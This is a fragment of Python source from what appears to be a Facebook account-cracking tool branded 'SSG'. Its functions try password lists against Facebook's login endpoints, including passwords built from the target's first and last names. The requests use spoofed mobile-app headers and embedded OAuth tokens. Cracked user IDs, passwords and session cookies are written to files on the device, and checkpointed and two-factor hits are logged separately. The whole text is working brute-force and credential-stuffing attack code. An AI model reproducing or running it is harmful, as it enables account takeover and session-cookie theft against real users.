			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				print('\r\r\033[1;32m [SSG-OK] '+uid+' √ '+pas)                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
			#	print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/SSG-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
                                
				break
			elif 'www.facebook.com' in po['error']['message']:                                
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [SSG-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/SSG-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
def bd1(ids,passlist):
    global loop
    global cps
    global oks   
    try:
        for ps in passlist:            
            session = requests.Session()
            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSSG\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
            pro = random.choice(S1())            
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'sb=1pKcZplhak53eU4IjYLAuvZR; datr=1pKcZjK1lh0vbo25AX_3wUAB; ps_l=1; ps_n=1',
    'dpr': '2',
    'referer': 'https://mbasic.facebook.com/cookie/consent_prompt/?next_uri=https%3A%2F%2Fmbasic.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fmbasic.facebook.com%252Fcheckpoint%252F1501092823525282%252Flogout%252F%253Fnext%253Dhttps%25253A%25252F%25252Fmbasic.facebook.com%25252F%2526paipv%253D0%2526eav%253DAfZOs6uHB6Ikoooog_L39JmXK7ufaasX5EYhbY9Lev-t5qqTpnUROsBDW8E9Y-aoYkY%26refsrc%3Ddeprecated&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,}
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m [SSG-OK] '+ids+' | '+ps)                
               # print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/SSG-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;33m [SSG-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/SSG-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mSSG-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass



def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSSG\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			head = {"User-Agent": S1(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
			data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [SSG-OK] '+uid+' √ '+pas)                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				#print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/SSG-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [SSG-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/SSG-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
menu()"))